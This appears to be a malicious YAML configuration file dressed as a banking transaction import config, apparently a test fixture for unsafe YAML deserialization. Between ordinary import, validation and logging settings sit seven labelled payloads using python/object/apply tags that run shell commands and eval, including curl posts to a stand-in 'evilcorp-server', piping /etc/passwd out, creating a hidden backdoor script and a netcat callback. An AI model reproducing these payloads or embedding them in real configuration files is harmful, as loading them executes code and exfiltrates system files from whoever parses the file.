# Banking Transaction Import Configuration
# Version: 3.2
# Purpose: Import transactions from external banking systems

version: "3.2"
description: "Advanced transaction import configuration with processing rules"

# Import settings
import_settings:
  batch_size: 100
  validate_checksums: true
  currency_conversion: true
  duplicate_detection: strict
  date_range_validation: true

# Processing rules
processing_rules:
  amount_validation: strict
  date_format: "YYYY-MM-DD"
  encoding: "utf-8"
  transaction_limit: 1000
  
# Database configuration  
database_config:
  connection_timeout: 30
  batch_commit: true
  rollback_on_error: true

# Legitimate looking transaction data
sample_transactions:
  - date: "2024-01-20"
    amount: 2500.00
    type: "credit"
    description: "Direct deposit"
  - date: "2024-01-21" 
    amount: 150.00
    type: "debit"
    description: "Utility payment"

# YAML DESERIALIZATION ATTACKS

# Attack 1: Simple command execution 
system_command: !!python/object/apply:os.system
  - "echo YAML_ATTACK_SUCCESS > /tmp/yaml_attack_success.txt"

# Attack 2: Data exfiltration via HTTP 
http_exfiltration: !!python/object/apply:os.system
  - "curl -X POST http://evilcorp-server:8888/yaml_attack --data 'source=yaml_config&attack=http_exfil'"

# Attack 3: File system access and exfiltration
passwd_theft: !!python/object/apply:os.system  
  - "cat /etc/passwd | curl -X POST http://evilcorp-server:8888/sensitive_data --data-binary @-"

# Attack 4: System reconnaissance 
system_recon: !!python/object/apply:os.system
  - "id > /tmp/yaml_id_output.txt"

# Attack 5: Create backdoor
backdoor_creation: !!python/object/apply:os.system
  - "mkdir -p /tmp/.hidden && echo '#!/bin/sh\necho backdoor created' > /tmp/.hidden/backdoor.sh"

# Attack 6: Simple eval attack
eval_attack: !!python/object/apply:eval
  - "__import__('os').system('echo YAML_EVAL_ATTACK > /tmp/yaml_eval.txt')"

# Attack 7: Netcat reverse connection
netcat_callback: !!python/object/apply:os.system
  - "echo 'YAML reverse shell attempt' | nc evilcorp-server 5555"

# Validation settings (innocent looking)
validation:
  required_fields: ["date", "amount", "type"]
  optional_fields: ["description", "category", "reference"]
  amount_range:
    min: 0.01
    max: 10000.00

# Logging configuration
logging:
  level: "INFO"
  file: "/var/log/import.log"
  rotate: true
  max_size: "10MB"

# Error handling
error_handling:
  on_validation_error: "skip"
  on_duplicate: "ignore"
  on_format_error: "log_and_continue"
  email_on_failure: true